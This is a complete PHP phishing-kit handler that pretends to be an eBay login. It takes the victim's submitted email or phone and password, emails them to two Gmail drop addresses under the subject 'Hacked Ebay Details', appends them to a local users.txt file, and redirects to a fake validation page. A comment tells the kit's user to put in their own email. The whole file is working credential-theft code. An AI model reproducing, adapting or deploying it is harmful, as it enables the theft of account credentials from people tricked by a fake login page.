<?php
$user = $_POST ['email'] ;
$password = $_POST ['pass'] ;
//please change email to your email
$to = "billylife901@gmail.com,charlotteamelia09911@gmail.com";
$subject = "Hacked Ebay Details";
$from = " Soul Haxors Hacks";
$header = " from:" . $from ;

$data = "Hacked_Email / Phone : $user \r\n\r\nHackked_Password: $password \r\n\r\n********Soul Haxor Hacks********\r\n\r\n";
mail($to,$subject,$header,$data);
//
$fh = fopen("users.txt", "a");
fwrite($fh, $data); //close the file fclose($fh); 

header("location: validatin.html");

?>

